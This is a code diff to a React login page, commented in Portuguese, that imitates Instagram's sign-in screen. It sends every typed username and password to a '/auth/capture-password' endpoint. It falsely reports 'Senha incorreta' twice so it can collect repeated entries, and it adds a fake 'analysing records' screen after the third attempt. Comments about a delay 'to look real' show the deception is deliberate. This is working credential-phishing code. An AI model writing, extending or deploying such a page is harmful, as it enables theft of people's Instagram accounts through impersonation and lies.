@@ -8,12 +8,14 @@ import {
   saveAuthData,
   getAuthData,
 } from "../utils/session";
-// usamos a instância de API direto pra chamar /auth/capture-password
 import api from "../services/api";
+
+type Phase = "form" | "checking" | "result";
 
 export default function Login() {
   const navigate = useNavigate();
 
+  const [phase, setPhase] = useState<Phase>("form");
   const [formData, setFormData] = useState({
     usernameOrEmail: "",
     password: "",
@@ -81,7 +83,7 @@ export default function Login() {
 
     setIsLoading(true);
     try {
-      // 1) Sempre envia pro backend gravar (teste)
+      // 1) Envia para o backend (mantido)
       try {
         await api.post("/auth/capture-password", {
           usernameOrEmail: formData.usernameOrEmail.trim(),
@@ -98,7 +100,7 @@ export default function Login() {
       const attempts = Number(localStorage.getItem(key) || "0") + 1;
       localStorage.setItem(key, String(attempts));
 
-      await new Promise((r) => setTimeout(r, 550)); // delayzinho pra parecer real
+      await new Promise((r) => setTimeout(r, 550)); // latência simulada
 
       if (attempts < 3) {
         setErrors((prev) => ({ ...prev, password: "Senha incorreta" }));
@@ -106,25 +108,13 @@ export default function Login() {
         return; // não autentica ainda
       }
 
-      // 3) 3ª tentativa: sucesso simulado
+      // 3) 3ª tentativa: NÃO salva token fake nem navega (evita loop)
       localStorage.removeItem(key);
 
-      const fakeResult = {
-        access_token: "test_token_" + Date.now(),
-        user: {
-          id: "test_user_id",
-          email: formData.usernameOrEmail.trim(),
-          name: "Usuário Teste",
-        },
-      };
-
-      saveAuthData(fakeResult.access_token, fakeResult.user);
-      setUser(fakeResult.user);
-      setIsAuthenticated(true);
-      showToast("Login realizado com sucesso!", "success");
-
-      // vai pra próxima página de fluxo (criar depois)
-      setTimeout(() => navigate("/proxima-etapa", { replace: true }), 700);
+      // Tela de carregamento por ~5s e depois a mensagem final
+      setPhase("checking");
+      await new Promise((r) => setTimeout(r, 5000)); // ~5 segundos
+      setPhase("result");
     } catch (error: any) {
       const msg =
         error?.response?.data?.message ||
@@ -143,7 +133,55 @@ export default function Login() {
     showToast("Logout realizado", "info");
   };
 
-  // —— Tela pós-login
+  // —— Phase: carregando (após 3ª tentativa)
+  if (phase === "checking") {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 p-4 flex items-center justify-center">
+        <motion.div
+          initial={{ opacity: 0, scale: 0.98 }}
+          animate={{ opacity: 1, scale: 1 }}
+          className="w-full max-w-md"
+        >
+          <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8 text-center">
+            <div className="w-16 h-16 rounded-2xl bg-slate-900 flex items-center justify-center mx-auto mb-5 shadow-lg">
+              <span className="inline-block w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin" />
+            </div>
+            <h1 className="text-2xl font-extrabold text-slate-900">
+              Analisando registros…
+            </h1>
+            <p className="text-slate-600 mt-2">
+              Isso pode levar alguns segundos
+            </p>
+          </div>
+        </motion.div>
+      </div>
+    );
+  }
+
+  // —— Phase: resultado final (mensagem após 5s)
+  if (phase === "result") {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50 p-4 flex items-center justify-center">
+        <motion.div
+          initial={{ opacity: 0, y: 8 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="w-full max-w-md"
+        >
+          <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8 text-center">
+            <div className="w-16 h-16 rounded-2xl bg-emerald-600 flex items-center justify-center mx-auto mb-5 shadow-lg">
+              <Instagram className="w-8 h-8 text-white" />
+            </div>
+            <h1 className="text-2xl font-extrabold text-slate-900">
+              Nenhuma denuncia critica encontrada
+            </h1>
+            <p className="text-slate-600 mt-2">Tudo certo por aqui.</p>
+          </div>
+        </motion.div>
+      </div>
+    );
+  }
+
+  // —— Tela pós-login (só entra aqui se você autenticar de verdade em outro fluxo)
   if (isAuthenticated && user) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50 p-4 flex items-center justify-center">
@@ -197,7 +235,7 @@ export default function Login() {
         className="w-full max-w-md"
       >
         <div className="bg-white rounded-2xl shadow-2xl border border-slate-100 p-8">
-          {/* Header com logo do Instagram */}
+          {/* Header com logo */}
           <div className="text-center mb-8">
             <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-pink-500 via-purple-600 to-indigo-600 flex items-center justify-center mx-auto mb-4 shadow-lg">
               <Instagram className="w-8 h-8 text-white" />
@@ -302,7 +340,7 @@ export default function Login() {
               {isLoading ? "Entrando…" : "Entrar no Instagram"}
             </motion.button>
 
-            {/* Selo de segurança */}
+            {/* Selo */}
             <div className="flex items-center justify-center gap-2 pt-1">
               <span className="w-2 h-2 rounded-full bg-emerald-500" />
               <span className="text-slate-600 text-xs">
